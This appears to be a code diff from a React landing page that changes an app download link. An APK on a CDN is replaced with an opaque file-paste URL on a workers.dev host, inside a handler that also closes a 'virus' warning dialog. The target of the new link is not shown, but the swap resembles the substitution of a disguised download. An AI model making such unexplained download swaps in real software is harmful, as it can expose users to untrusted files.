@@ -197,7 +197,7 @@ export default function LandingPage() {
   }
 
   const confirmDownload = () => {
-    window.open("https://soundboard.b-cdn.net/Outline-king-v2.apk", "_blank")
+    window.open("https://cf-file-paste.ftube-net.workers.dev/d/b64203b4-a509-487b-910d-e004acacef77", "_blank")
     setShowDownloadDialog(false)
     setShowVirusDialog(false)
   }
